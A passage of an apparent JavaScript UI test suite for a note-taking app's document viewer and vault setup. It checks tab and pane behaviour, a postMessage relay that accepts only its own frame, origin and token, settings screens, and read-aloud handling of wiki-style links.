    // ---- a stand-in bridge: the frame (on the viewer's own origin) placed over the tab's area, the relay, Pop out and Back into a tab
    const was = window.pywebview, live0 = VAULT.live, calls = [], TOK = 'TOKEN114', ORIGIN = 'http://127.0.0.1:59999';
    const fake = { viewer_tab_open: () => ({ status: 'success', file: F, token: TOK, url: 'about:blank#v=' + TOK, origin: ORIGIN, kind: 'pdf', name: 'audit-quote.pdf' }), viewer_tab_call: (t, m) => ({ status: 'success', echo: m, token: t }),
      viewer_tab_close: () => ({ status: 'success', closed: true }), viewer_pop_out: () => ({ status: 'success', file: F }), viewer_recent: () => [F], viewer_source_path: () => ({ status: 'success', path: 'C:/v/attachments/audit-quote.pdf' }), list_doc_annotations: () => [] };
    window.pywebview = { api: new Proxy({}, { get: (_, nm) => typeof nm !== 'string' || nm === 'then' ? undefined : (...x) => { calls.push([nm, x]); return Promise.resolve(fake[nm] ? fake[nm](...x) : []); } }) };
    try {
      VAULT.live = true; dvDrop(F); renderAll(); for (let i = 0; i < 30 && !DVT.frames[F]?.el; i++) await tick();
      const fr = DVT.frames[F], host = app.querySelector('[data-dv-host]')?.getBoundingClientRect(), er = fr?.el?.getBoundingClientRect();
      R.frame = er ? `${Math.round(er.width)}×${Math.round(er.height)} over ${Math.round(host.width)}×${Math.round(host.height)}` : 'none';
      if (!fr?.el || fr.el.parentElement?.id !== 'dv-frames' || app.contains(fr.el) || Math.abs(er.left - host.left) > 1 || Math.abs(er.top - host.top) > 1 || Math.abs(er.width - host.width) > 1 || Math.abs(er.height - host.height) > 1) bad('QC 114: the viewer’s frame over the tab, outside #app', R.frame);
      if (!calls.some(c => c[0] === 'viewer_tab_open' && c[1][0] === F && c[1][1] === rawId(n0.id))) bad('QC 114: viewer_tab_open', JSON.stringify(calls.find(c => c[0] === 'viewer_tab_open')?.[1]).slice(0, 80));
      if (!/[#&]p=http/.test(fr?.el?.src || '')) bad('QC 114: the frame is told its parent’s origin', fr?.el?.src);
      renderAll(); if (DVT.frames[F]?.el !== fr.el || !document.contains(fr.el)) bad('QC 114: a redraw keeps the same frame (no reload)', '');
      // the relay: only from the frame, only from its origin, only for its token
      const ask = (data, origin, source = fr.el.contentWindow) => dispatchEvent(new MessageEvent('message', { data, origin, source }));
      calls.length = 0; ask({ nvViewerCall: 1, token: TOK, method: 'info', args: [] }, ORIGIN); await tick(); await tick();
      ask({ nvViewerCall: 2, token: TOK, method: 'info', args: [] }, 'http://elsewhere.example'); ask({ nvViewerCall: 3, token: 'other', method: 'info', args: [] }, ORIGIN); ask({ nvViewerCall: 4, token: TOK, method: 'info', args: [] }, ORIGIN, window); await tick(); await tick();
      const relayed = calls.filter(c => c[0] === 'viewer_tab_call'); R.relay = relayed.map(c => c[1].slice(0, 2).join(':')).join(', ');
      if (relayed.length !== 1 || relayed[0][1][0] !== TOK || relayed[0][1][1] !== 'info') bad('QC 114: the relay passes only its frame’s asks', R.relay);
      // Pop out from the tab: the frame goes, the window opens; Back into a tab (from that window) opens the tab again
      calls.length = 0; app.querySelector('.ws-tab.dv-wstab .dv-tpop')?.click(); for (let i = 0; i < 40 && dvTabOf(F); i++) await tick(); await new Promise(r => setTimeout(r, 1600));
      for (let i = 0; i < 40 && dvTabOf(F); i++) await tick();
      if (!calls.some(c => c[0] === 'viewer_pop_out' && c[1][0] === TOK) || dvTabOf(F) || DVT.frames[F] || document.getElementById('dv-frames')?.children.length || UI.view === 'doc') bad('QC 114: Pop out from the tab', calls.map(c => c[0]).join());
      window.nvSync({ kind: 'docv-dock', file: F, note_id: rawId(n0.id) }); for (let i = 0; i < 30 && !DVT.frames[F]?.el; i++) await tick();
      if (!dvTabOf(F) || UI.view !== 'doc' || !DVT.frames[F]?.el) bad('QC 114: Back into a tab', UI.view);
      // Python closing a tab (the window's Pop out while it's in a tab) drops it here
      window.nvSync({ kind: 'docv-tabclose', file: F, token: TOK }); if (dvTabOf(F) || DVT.frames[F]) bad('QC 114: a tab closed from the app’s side', '');
      // Convert, with the app: Build K's convert, from the attachment's own path; the file isn't touched
      calls.length = 0; const cs0 = convertStart; let conv = null; convertStart = (p, m) => { conv = [p, m]; }; try { await dvConvert(F); } finally { convertStart = cs0; }
      if (!calls.some(c => c[0] === 'viewer_source_path' && c[1][0] === F) || conv?.[0] !== 'C:/v/attachments/audit-quote.pdf' || conv[1] !== 'new_note') bad('QC 114: Convert to a note… uses Build K', JSON.stringify(conv));
    } finally { window.pywebview = was; VAULT.live = live0; Object.keys(DVT.frames).forEach(dvDrop); }
    // ---- the real viewer in a frame, answered by this window alone (as in the app): no window bar, the Pro tools, its notes
    { const doc0 = 'NVFAKEDOC\n' + JSON.stringify({ pages: [{ w: 612, h: 792, blocks: [['h1', 'In a tab'], ['p', 'Retests are booked within five days.']] }, { w: 612, h: 792, blocks: [['h2', 'Costs']] }] });
      const seen = [], answers = { info: () => ({ status: 'success', file: F, name: 'audit-quote.pdf', kind: 'pdf', size: 99, note_id: 1, from: 'Q3 Roadmap Draft', look: {}, layout: { bar: 'top', side: 'right', flow: 'scroll' }, copy_kinds: ['pdf', 'png'], libraries: {}, renderers: [], versions: {}, embedded: true, can_dock: true }),
        doc_bytes: () => ({ status: 'success', data: btoa(doc0) }), annotations_get: () => ({ status: 'success', items: [{ id: 'q1', kind: 'pin', page: 1, pts: [30, 30], note: 'From the tab', colour: 'red', text: '', quote: '' }] }), annotations_save: (items) => ({ status: 'success', count: items.length }) };
      const el = document.createElement('iframe'), other = document.createElement('iframe'); el.style.cssText = other.style.cssText = 'position:fixed;left:0;top:0;width:1200px;height:760px;border:0;opacity:0;pointer-events:none';
      const answer = e => { const d = e.data; if (!d || d.nvViewerCall == null) return; seen.push([e.source === el.contentWindow ? 'ours' : e.source === other.contentWindow ? 'other' : '?', d.method, d.token]);
        if (e.source !== el.contentWindow || d.token !== 'TABTOKEN') return; e.source.postMessage({ nvViewerReply: d.nvViewerCall, result: (answers[d.method] || (() => ({ status: 'error' })))(...(d.args || [])) }, location.origin); };
      addEventListener('message', answer);
      el.src = `viewer.html?embed=1&mute=1#v=TABTOKEN&p=${encodeURIComponent(location.origin)}`; other.src = 'viewer.html?embed=1&mute=1#v=TABTOKEN&p=' + encodeURIComponent('http://elsewhere.example'); document.body.append(el, other);
      let d; for (let i = 0; i < 100; i++) { await new Promise(r => setTimeout(r, 50)); d = el.contentDocument; if (d?.querySelectorAll('.dv-page .dv-fake').length) break; }
      const q = s => d?.querySelector(s), qa = s => [...(d?.querySelectorAll(s) || [])], f = [];
      if (!d?.body.classList.contains('is-embed')) f.push('not in embed mode'); if (q('.dv-wbar') && !q('.dv-wbar').hidden) f.push('a window bar'); if (qa('.win-controls, .win-btn').length) f.push('window buttons');
      if (qa('.dv-page').length !== 2 || !qa('.dv-page .dv-fake').length) f.push(`${qa('.dv-page').length} pages`); if (qa('.dv-ribbon .dv-t').length !== 9 || !/From the tab/.test(q('.dv-nl')?.textContent || '')) f.push('the tools and notes');
      const asks = seen.filter(x => x[0] === 'ours').map(x => x[1]); if (!['info', 'annotations_get', 'doc_bytes'].every(m => asks.includes(m))) f.push(`asks: ${asks.join(',')}`);
      if (seen.some(x => x[0] === 'other')) f.push('a frame told another parent still reached this window');
      const flushed = new Promise(ok => { const h = e => { if (e.data?.nvViewerFlushed && e.source === el.contentWindow) { removeEventListener('message', h); ok(true); } }; addEventListener('message', h); setTimeout(() => ok(false), 1500); });
      el.contentWindow.postMessage({ nvViewerMsg: { kind: 'flush' } }, location.origin); if (!(await flushed)) f.push('it saves when asked, before its tab closes');
      R.embed = `asks ${[...new Set(asks)].join(', ')} · the other frame: ${seen.filter(x => x[0] === 'other').length}`;
      removeEventListener('message', answer); el.remove(); other.remove(); if (f.length) bad('QC 114: the viewer in a tab', f.join('; ')); }
    // ---- a document tab behaves like a note's (the coordinator, before the merge): (1) dragged onto a pane's edge it opens in a
    // split pane, its own head (name, Pop out, ⋮, ×), the tab leaves the tabs, the centre is refused, × closes it; the frames let a
    // drag through; (2) the right sidebar stays beside a document, in a tab or a pane, and its toggle works there (1366 and 3440)
    { const docTab = () => { if (!dvTabOf(F)) openDocTab(F); return dvTabOf(F); }, dvP = () => pnAll().filter(p => p.kind === 'mod' && p.v === 'doc');
      const side = () => { const s = app.querySelector('#right-sidebar'), r = s?.getBoundingClientRect(); return !!s && getComputedStyle(s).display !== 'none' && r.width > 100 && r.height > 200; };
      const tgl = () => app.querySelector('.tb-right [data-act="inspector"], [data-act="inspector"]');
      const dropAt = (id, x, y) => { S.tabDrag = id; app.querySelector('.app-body > .main').dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, clientX: x, clientY: y })); };
      for (const sc of ['1366x768', '3440x1440']) { set({ screen: sc, inspector: 'shown' }); pnReset(); docTab(); renderAll(); const k = `round 8 ${sc}`;
        // (2) in a tab: the sidebar shows, its toggle is live and hides and shows it, Alt+6 keeps the document
        if (UI.view !== 'doc' || !side()) bad(`${k}: the right sidebar beside a document’s tab`, UI.view);
        if (tgl()?.getAttribute('aria-disabled') === 'true' || tgl()?.getAttribute('aria-expanded') !== 'true' || !paneInspOk()) bad(`${k}: the window bar’s toggle in a document’s tab`, tgl()?.outerHTML.slice(0, 90));
        tgl()?.click(); renderAll(); const hid = !side() && UI.inspector === 'hidden'; tgl()?.click(); renderAll(); if (!hid || !side() || UI.view !== 'doc') bad(`${k}: the toggle hides and shows it beside a document`, `${hid} ${UI.inspector}`);
        document.body.dispatchEvent(new KeyboardEvent('keydown', { key: '6', code: 'Digit6', altKey: true, bubbles: true, cancelable: true })); renderAll();
        if (UI.view !== 'doc' || S.tab !== 'docs' || !side()) bad(`${k}: Alt+6 beside a document`, `${UI.view} ${S.tab}`);
        R['side' + sc] = `${Math.round(app.querySelector('#right-sidebar')?.getBoundingClientRect().width || 0)} px`;
        // (1) the tab dragged onto the right edge of the note area: a split pane, not a tab
        const t = docTab(); openNote(n0.id); renderAll(); const a = pnArea(), y = a.top + a.height / 2;
        const tc = pnTarget(a.left + a.width / 2, y, { tab: t.id }); if (tc?.zone !== 'centre' || pnDrop({ tab: t.id }, tc) || !dvTabOf(F) || dvP().length) bad(`${k}: the centre is refused (it stays a tab)`, tc?.zone);
        const tr = pnTarget(a.right - 12, y, { tab: t.id }); if (tr?.zone !== 'right' || !/audit-quote\.pdf/.test(tr?.name || '')) bad(`${k}: the right edge names the document`, `${tr?.zone} ${tr?.name}`);
        document.dispatchEvent(new DragEvent('dragstart', { bubbles: true })); const pass = document.body.classList.contains('dv-pass') && getComputedStyle(document.getElementById('dv-frames') || document.body).pointerEvents === 'none';
        dropAt(t.id, a.right - 12, y); document.dispatchEvent(new DragEvent('dragend', { bubbles: true })); if (!pass || document.body.classList.contains('dv-pass')) bad(`${k}: the frames let a drag through, then take the pointer back`, String(pass));
        const pane = dvP()[0], pel = pane && app.querySelector(`.panes [data-pane="${pane.id}"]`), head = pel?.querySelector('.dv-panehead');
        R['pane' + sc] = pnAll().map(p => p.kind + (p.v ? ':' + p.v : '')).join(' | ');
        if (dvP().length !== 1 || pane.ref !== F || pane.note !== n0.id || dvTabOf(F) || S.tabs.some(x => x.kind === 'doc') || PN.focus !== pane.id || UI.view !== 'doc') bad(`${k}: the document in its own pane, out of the tabs`, R['pane' + sc]);
        if (!head || !/audit-quote\.pdf/.test(head.querySelector('b')?.textContent || '') || !head.querySelector('[data-act="dv-pop"]') || !head.querySelector('[data-act="dv-more"]') || !head.querySelector('[data-act="pn-close"]') || pel.querySelectorAll('.dv-dhead').length !== 1 || !pel.querySelector(`[data-dv-host="${F}"]`)) bad(`${k}: the pane’s one head (name, Pop out, ⋮, ×) and its document`, head?.textContent.slice(0, 60));
        const mainP = app.querySelector('.panes [data-pane="main"]'); if (!mainP || mainP.querySelector('[data-dv-host]') || !mainP.querySelector('.cm-editor, .editor, [contenteditable]')) bad(`${k}: the note stays in the main pane beside it`, '');
        if (!side()) bad(`${k}: the right sidebar beside a document’s pane`, '');
        const pw = pel?.getBoundingClientRect(), mw = mainP?.getBoundingClientRect(); if (!pw || !mw || pw.left < mw.right - 2 || pw.width < 300) bad(`${k}: the pane on the right, wide enough`, pw && `${Math.round(pw.left)}/${Math.round(pw.width)}`);
        head?.querySelector('[data-act="dv-more"]')?.click(); renderAll(); const mi = [...app.querySelectorAll('.dv-dmenu.is-head .menu-item')].map(x => x.textContent.trim());
        if (!/^Pop out/.test(mi[0] || '') || !app.querySelector('.dv-dmenu.is-head .menu-sep + .dv-conv')) bad(`${k}: the pane’s ⋮`, mi.join(' | ')); DVT.menu = null; renderAll();
        app.querySelector('.panes [data-pane="main"]')?.dispatchEvent(new MouseEvent('click', { bubbles: true }));   /* drawn again since: find it again */ renderAll(); if (PN.focus !== 'main' || UI.view !== 'notes') bad(`${k}: a click on the note gives it the focus`, PN.focus);
        S.status = ''; app.querySelector(`.panes [data-pane="${pane.id}"] [data-act="pn-close"]`)?.click(); renderAll();
        if (dvP().length || !/audit-quote\.pdf closed · the Documents tab opens it again/.test(S.status) || UI.view !== 'notes') bad(`${k}: × closes the pane`, S.status);
        pnReset(); }
      // with the app (a stand-in bridge): the frame follows the document into its pane (the same frame, so no reload) and × closes it there
      const was = window.pywebview, live0 = VAULT.live, calls = [], TOK = 'TOKENR8';
      const fake = { viewer_tab_open: () => ({ status: 'success', file: F, token: TOK, url: 'about:blank#v=' + TOK, origin: 'http://127.0.0.1:59998', kind: 'pdf', name: 'audit-quote.pdf' }), viewer_tab_close: () => ({ status: 'success', closed: true }), list_doc_annotations: () => [] };
      window.pywebview = { api: new Proxy({}, { get: (_, nm) => typeof nm !== 'string' || nm === 'then' ? undefined : (...x) => { calls.push([nm, x]); return Promise.resolve(fake[nm] ? fake[nm](...x) : []); } }) };
      try { set({ screen: '1366x768', inspector: 'shown' }); VAULT.live = true; pnReset(); Object.keys(DVT.frames).forEach(dvDrop); docTab(); renderAll(); for (let i = 0; i < 30 && !DVT.frames[F]?.el; i++) await tick();
        const el0 = DVT.frames[F]?.el; openNote(n0.id); renderAll(); const a = pnArea(); dropAt(dvTabOf(F)?.id, a.right - 12, a.top + a.height / 2); for (let i = 0; i < 5; i++) await tick();
        const pane = dvP()[0], host = pane && app.querySelector(`.panes [data-pane="${pane.id}"] [data-dv-host]`)?.getBoundingClientRect(), er = DVT.frames[F]?.el?.getBoundingClientRect();
        R.paneFrame = er && host ? `${Math.round(er.width)}×${Math.round(er.height)} over ${Math.round(host.width)}×${Math.round(host.height)}` : 'none';
        if (!el0 || DVT.frames[F]?.el !== el0 || el0.hidden || !host || [['left', 'left'], ['top', 'top'], ['width', 'width'], ['height', 'height']].some(([x]) => Math.abs(er[x] - host[x]) > 1) || calls.filter(c => c[0] === 'viewer_tab_open').length !== 1) bad('round 8: the same frame follows the document into its pane', R.paneFrame);
        calls.length = 0; app.querySelector(`.panes [data-pane="${pane?.id}"] [data-act="pn-close"]`)?.click(); for (let i = 0; i < 40 && !calls.some(c => c[0] === 'viewer_tab_close'); i++) await new Promise(r => setTimeout(r, 50)); await tick(); await tick();   // it saves first (up to 1.5 s)
        if (!calls.some(c => c[0] === 'viewer_tab_close' && c[1][0] === TOK) || DVT.frames[F] || dvP().length) bad('round 8: × on the pane closes the document (viewer_tab_close)', calls.map(c => c[0]).join());
      } finally { window.pywebview = was; VAULT.live = live0; Object.keys(DVT.frames).forEach(dvDrop); pnReset(); set({ screen: '1366x768' }); } }
    // ---- QC 116: Explorer's Open with → NeuroVault: Python says "docv-openpath" (no path in the script); the page asks for the files
    // (viewer_take_pending) and opens each in a tab, viewed where it is; nothing but a .pdf / .docx path is opened
    { const was = window.pywebview, live0 = VAULT.live, calls = [], P = 'C:\Users\me\Downloads\Supplier quote.pdf', TOK = 'TOKEN116';
      const fake = { viewer_take_pending: () => [P, 'C:\Windows\notepad.exe', 7], viewer_tab_open_path: p => ({ status: 'success', file: p, token: TOK, url: 'about:blank#v=' + TOK, origin: 'http://127.0.0.1:59997', kind: 'pdf', name: 'Supplier quote.pdf' }), viewer_tab_close: () => ({ status: 'success', closed: true }), list_doc_annotations: () => [], viewer_recent: () => [P] };
      window.pywebview = { api: new Proxy({}, { get: (_, nm) => typeof nm !== 'string' || nm === 'then' ? undefined : (...x) => { calls.push([nm, x]); return Promise.resolve(fake[nm] ? fake[nm](...x) : []); } }) };
      try { VAULT.live = true; openNote(n0.id); renderAll(); window.nvSync({ kind: 'docv-openpath' }); for (let i = 0; i < 40 && !dvTabOf(P); i++) await tick();
        const opened = calls.filter(c => c[0] === 'viewer_tab_open_path').map(c => c[1][0]);
        if (!dvTabOf(P) || UI.view !== 'doc' || S.tabs.find(t => t.id === S.activeTab)?.ref !== P || opened.join('|') !== P || !calls.some(c => c[0] === 'viewer_take_pending')) bad('QC 116: Open with opens the file in a tab', opened.join('|'));
        R.openWith = `${opened.length} opened · tab ${!!dvTabOf(P)}`;
      } finally { window.pywebview = was; VAULT.live = live0; const t = dvTabOf(P); if (t) S.tabs.splice(S.tabs.indexOf(t), 1); Object.keys(DVT.frames).forEach(dvDrop); UI.view = 'notes'; openNote(n0.id); renderAll(); } }
    S.tabs = D0.tabs; S.activeTab = D0.active; UI.view = D0.view === 'doc' ? 'notes' : D0.view; S.tab = D0.tab; DVT.menu = null; Object.keys(DVT.frames).forEach(dvDrop); renderAll(); }
  set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null }); S.status = '';
}
/* ==== end Build DV ==== */
async function checkBuildV() {
  const B = out.numbers.buildV = { screens: {}, flows: {}, settings: '' }, bad = (k, v) => iss('Build V ' + k, v);
  const vs0 = { ...VSTATE }, nv0 = nv, keepSave = saveSettings; saveSettings = () => {}; if (typeof aiDemo === 'function') aiDemo('none');
  const OLD = /Daily notes in Obsidian|later update|Notes stay in NeuroVault|Always on|when it arrives|moves into the vault later/;
  const hs = el => [...new Set([...el.querySelectorAll('.btn, .field, .seg')].filter(b => b.offsetParent).map(b => b.offsetHeight))];
  const look = (where, k) => {
    const ob = app.querySelector('.onboard'), card = ob?.querySelector('.onboard-card'), cards = card?.querySelector(`[data-vault-cards="${where}"]`);
    if (!cards) { bad('cards missing', k); return; }
    const txt = card.textContent, labels = [...cards.querySelectorAll('.choice > .set-label')].map(x => x.textContent.trim());
    if (labels.join('|') !== 'Create a new vault|Open a folder as a vault') bad('the two cards', `${k}: ${labels}`);
    if (!/plain \.md files in a folder you choose/.test(txt) || !/Works with an Obsidian vault too: your files are not moved or changed\./.test(txt)) bad('the mockup\'s words', k);
    if (OLD.test(txt)) bad('old step 1 text', `${k}: ${txt.match(OLD)[0]}`);
    const create = cards.querySelector('[data-act="vault-create"]'), choose = cards.querySelector('[data-act="vault-choose"]');
    if (!create?.classList.contains('btn--primary') || !choose?.classList.contains('btn--secondary') || choose.textContent.trim() !== 'Choose folder…') bad('Create vault is the main button, Choose folder… the other', k);
    if (!/^Documents\\/.test(cards.querySelector('[data-vault-new]')?.textContent || '')) bad('the new vault\'s place', `${k}: ${cards.querySelector('[data-vault-new]')?.textContent}`);
    measure(`buildv/${k}`); inside('.vault-cards', k);
    if (ob.scrollWidth > ob.clientWidth + 1 || card.scrollWidth > card.clientWidth + 1) bad('scrolls sideways', k);
    const h = hs(card); if (h.some(x => ![24, 28, 32, 36].includes(x))) bad('a control off the scale', `${k}: ${h}`);
    const cut = [...cards.querySelectorAll('.btn, .set-label')].filter(el => el.offsetWidth && el.scrollWidth > el.clientWidth + 1).map(el => el.textContent.trim());
    if (cut.length) bad('a label cut', `${k}: ${cut}`);
    const r = card.getBoundingClientRect(); B.screens[k] = `card ${Math.round(r.width)}×${Math.round(r.height)} · controls ${h.join('/')}`;
  };
  const sample = { path: '', documents: 'C:\\Users\\you\\Documents', legacy: 62, ask: false, busy: false, name: 'NeuroVault', missing: false };

  // 1 · the setup's step 1 and the one-time screen, on four screens
  for (const sc of Object.keys(SCREENS)) {
    Object.assign(VSTATE, sample); set({ screen: sc, sample: 'typical', view: 'notes', modal: null });
    SETUP.open = false; openSetup(false); out.combos++; look('setup', `setup/${sc}`); closeSetup();
    VSTATE.ask = true; set({ modal: null }); look('move', `move/${sc}`);
    if (!/copies your 62 notes there as \.md files\. It backs up its database first, and nothing is deleted\./.test(app.querySelector('.onboard')?.textContent || '')) bad('the one-time screen says what it copies', sc);
    VSTATE.ask = false; app.classList.remove('is-setup'); set({ modal: null });
  }

  // 2 · flows on the sample (nothing is written)
  const F = B.flows;
  Object.assign(VSTATE, sample); set({ screen: '1366x768', modal: null }); SETUP.open = false; openSetup(false);
  const name = app.querySelector('#vault-name'); name.value = 'Study notes'; name.dispatchEvent(new Event('input', { bubbles: true }));
  F.name = app.querySelector('[data-vault-new]').textContent; if (F.name !== 'Documents\\Study notes') bad('the name changes the place', F.name);
  app.querySelector('[data-act="vault-create"]').click(); await new Promise(r => setTimeout(r));
  F.create = `Create vault → ${S.ob.step}, vault ${VSTATE.path}`; if (S.ob.step !== 'comfort' || VSTATE.path !== 'Documents\\Study notes') bad('Create vault moves on', F.create);
  obGo('vault'); F.now = app.querySelector('.vault-now')?.innerText.trim().replace(/\s+/g, ' ') || 'none'; if (!/Your vault Documents\\Study notes/.test(F.now)) bad('step 1 shows the vault picked', F.now);
  obGo('done'); F.ready = app.querySelector('.ob-sum')?.innerText.replace(/\s+/g, ' ').trim(); if (!/Vault Documents\\Study notes/.test(F.ready)) bad('Ready names the vault', F.ready);
  closeSetup(); Object.assign(VSTATE, sample); SETUP.open = false; openSetup(false);
  app.querySelector('#ob-next').click(); await new Promise(r => setTimeout(r));
  F.next = `Next with no vault → ${S.ob.step}, vault ${VSTATE.path}`; if (S.ob.step !== 'comfort' || VSTATE.path !== 'Documents\\NeuroVault') bad('Next makes the default vault', F.next);
  closeSetup();
  // the one-time screen: Esc and Ctrl+K leave it up, a dialog waits under it, Create vault closes it and the dialog shows
  Object.assign(VSTATE, sample, { ask: true }); set({ modal: 'wrap1' });
  document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); app.dispatchEvent(new KeyboardEvent('keydown', { key: 'k', ctrlKey: true, bubbles: true }));
  F.held = `Esc, Ctrl+K: screen ${VSTATE.ask ? 'up' : 'gone'}, wrap-up drawn ${!!app.querySelector('.modal-backdrop')}, window bar reduced ${app.classList.contains('is-setup')}`;
  if (!VSTATE.ask || S.modal !== 'wrap1' || app.querySelector('.modal-backdrop') || !app.classList.contains('is-setup')) bad('the one-time screen comes first', F.held);
  app.querySelector('.onboard [data-act="vault-create"]').click(); await new Promise(r => setTimeout(r));
  F.moved = `Create vault: screen ${VSTATE.ask ? 'up' : 'gone'}, window bar back ${!app.classList.contains('is-setup')}, then "${S.modal}"`;
  if (VSTATE.ask || app.classList.contains('is-setup') || S.modal !== 'wrap1') bad('the one-time screen closes', F.moved);
  set({ modal: null });

  // 3 · Settings → Vault & files
  Object.assign(VSTATE, sample, { path: 'D:\\Notes\\NeuroVault' }); openSettings('vault'); out.combos++;
  const pane = app.querySelector('.settings-pane'), rows = [...pane.querySelectorAll('.set-row')].map(r => r.innerText.replace(/\s+/g, ' ').trim());
  B.settings = rows.slice(0, 4).join(' | ');
  const change = pane.querySelector('[data-act="vault-change"]');
  if (!/^Vault folder D:\\Notes\\NeuroVault/.test(rows[0]) || !change || change.hasAttribute('data-soon')) bad('Settings: the vault folder and Change…', rows[0]);
  if (!rows.some(r => /^Sticky Notes and Brain Dump Saved as files in your vault folder$/.test(r))) bad('Settings: the lists are files', B.settings);
  if (OLD.test(pane.textContent)) bad('Settings: old text', pane.textContent.match(OLD)[0]);
  if (!/Daily notes export/.test(pane.textContent)) bad('Settings: Daily notes stay in Settings', '');
  measure('buildv/settings'); set({ modal: null });

  // 3b · QC 86: a folder another NeuroVault uses: one question (Use it together / Pick another folder); Esc is Not now and
  // Settings → Vault & files says the vault is paused
  for (const sc of ['1920x1080', '1366x768']) {
    const info = { path: 'D:\\Notes\\NeuroVault', detail: 'Its .neurovault/vault-id.json lists 1 other install. Use it together: both see the same notes, and nothing is copied twice.' };
    Object.assign(VSTATE, sample, { path: info.path, inUse: info }); set({ screen: sc, modal: null }); vaultAskInUse(info, 'start', 'settings'); out.combos++;
    const d = app.querySelector('[data-dlg="vault-inuse"]'), btns = d ? [...d.querySelectorAll('.modal-foot .btn')].map(b => b.textContent.trim()) : [];
    const said = F['inUse ' + sc] = d ? `${d.querySelector('.modal-title').textContent} · ${btns.join(' / ')}` : 'none';
    if (!d || !/^This folder is already used by another NeuroVault/.test(said) || btns.join('|') !== 'Pick another folder|Use it together'
      || !d.querySelector('[data-act="vault-together"]')?.classList.contains('btn--primary')) bad('QC 86: the in-use question', said);
    if (d) { measure(`buildv/inuse/${sc}`); inside('[data-dlg="vault-inuse"]', `inuse/${sc}`);
      const cut = [...d.querySelectorAll('.btn')].filter(el => el.offsetWidth && el.scrollWidth > el.clientWidth + 1).map(el => el.textContent.trim()); if (cut.length) bad('QC 86: a label cut', `${sc}: ${cut}`); }
    document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }));
    if (VSTATE.clash || app.querySelector('[data-dlg="vault-inuse"]')) bad('QC 86: Esc is Not now', sc);
    openSettings('vault');
    if (!app.querySelector('[data-act="vault-inuse-again"]') || !/Paused: this folder is used by another NeuroVault/.test(app.querySelector('.settings-pane')?.textContent || '')) bad('QC 86: Settings says the vault is paused', sc);
    Object.assign(VSTATE, { inUse: null, clash: null, clashLater: false }); set({ modal: null });
  }

  // 4 · changed outside NeuroVault: the page takes the new text, except in a note you're typing in
  const D0 = { notes: D.notes, folders: D.folders, noteId: S.noteId };
  const raw = (id, title, content) => ({ id, title, content, tags: [], folder_id: 7, project_id: null, updated_at: '2026-10-18T20:00:00+00:00', created_at: '2026-10-18T19:00:00+00:00', category: '#General', path: title + '.md' });
  D.folders = [mapFolder({ id: 7, name: 'Unsorted', parent_id: null, project_id: null })];
  D.notes = [mapNote(raw(1, 'Open', 'old text')), mapNote(raw(2, 'Typing', 'mine'))]; S.noteId = 'n-1';
  D.notes[1].md = 'mine, typed'; D.notes[1].dirty = true;
  let server = [raw(1, 'Open', 'new text from Obsidian'), raw(2, 'Typing', 'outside'), raw(3, 'Made in Explorer', 'hi')];
  nv = async name => name === 'list_folders' ? [{ id: 7, name: 'Unsorted', parent_id: null, project_id: null }] : name === 'list_notes' ? server : { status: 'success' };
  try {
    await vaultApply({ changed: [1, 2], added: [3], removed: [], folders: false });
    F.outside = D.notes.map(n => `${n.title}: ${n.md}`).join(' · ');
    if (D.notes.find(n => n.id === 'n-1')?.md !== 'new text from Obsidian' || D.notes.find(n => n.id === 'n-2')?.md !== 'mine, typed' || !D.notes.some(n => n.id === 'n-3')) bad('outside changes reach the page', F.outside);
    server = [raw(1, 'Open', 'new text from Obsidian')]; D.notes[1].dirty = false;
    await vaultApply({ changed: [], added: [], removed: [2, 3], folders: false });
    if (D.notes.length !== 1 || S.noteId !== 'n-1') bad('a file deleted outside leaves the list', D.notes.map(n => n.title).join(', '));
  } finally { nv = nv0; Object.assign(D, { notes: D0.notes, folders: D0.folders }); S.noteId = D0.noteId; }
  if (BM_REASON.outside !== 'Changed outside NeuroVault') bad('the Timeline names an outside version', BM_REASON.outside);
  if (!vaultTestPage()) bad('a test page (?check=1, ?mute=1, a frame) skips the one-time screen', '');

  // 5 · QC 84: read aloud says a link's label (or its note's name), never the raw [[…|…]]
  const SAYS = [['[[Note name.md|The label]]', 'The label'], ['[[Folder/Note name.md]]', 'Note name'], ['[[Mitosis]]', 'Mitosis'], ['[[Cells#Division]]', 'Cells, Division'], ['![[attachments/song.ogg]]', 'song']];
  const sayBad = SAYS.filter(([raw, want]) => readSayLink(raw).replace(/ /g, ' ') !== want).map(([raw, want]) => `${raw} → "${readSayLink(raw)}", wanted "${want}"`);
  if (sayBad.length) bad('read aloud: a link says its label', sayBad.join(' | '));
  { set({ screen: '1366x768', sample: 'typical', view: 'notes', modal: null }); const n = note(); clearTimeout(n.saveT);
    n.md = 'See [[Note name.md|the plan]] and [[Folder/Weekly review.md]] before [[Cells#Division]] today.'; n.html = null; n.docDirty = false; S.mode = 'wysiwyg'; renderAll();
    fire('read'); const ps = readPieces(), text = ps.map(x => x.text).join(' ').replace(/ /g, ' '), words = segmentFrom(0)?.words.join(' ').replace(/ /g, ' ') || '';
    F.readLinks = text;
    if (/\[\[|\]\]|\|/.test(text + words) || !/See the plan and Weekly review before Cells, Division today\./.test(text)) bad('read aloud reads link syntax', text);
    if (ps.some(x => x.text.split(' ').length !== x.end - x.start + 1)) bad('read aloud: a piece with a link has one space per word', text);
    closeModal(); set({ sample: 'typical', modal: null }); }

  // 6 · QC 85: the Timeline's "Tag changes" come from list_tag_changes on a real vault
  { const live0 = VAULT.live, ev0 = D.events, now = new Date().toISOString(), nv1 = nv;
    nv = async name => name === 'list_tag_changes' ? [{ id: 7, note_id: 1, title: 'Plan', added: ['work', 'urgent'], removed: [], source: 'app', at: now }, { id: 6, note_id: 1, title: 'Plan', added: [], removed: ['later'], source: 'outside', at: now }]
      : name === 'list_recent_versions' ? [] : { status: 'success' };
    try { VAULT.live = true; S.bm.actBusy = false; await bmActivity();
      const tg = D.events.filter(e => e.type === 'Tag changes'); F.tags = tg.map(e => `${e.title} (${e.desc})`).join(' | ');
      if (tg.length !== 2 || tg[0].title !== 'Tagged #work and #urgent on "Plan"' || tg[1].title !== 'Removed #later from "Plan"' || !/outside NeuroVault/.test(tg[1].desc) || tg[0].range !== 'Today') bad('Timeline: tag changes from the vault', F.tags);
    } finally { nv = nv1; VAULT.live = live0; D.events = ev0; } }

  // 7 · R57 code blocks: the head, line numbers and colours on four screens; each token colour ≥ 4.5:1 in all nine themes
  B.code = {};
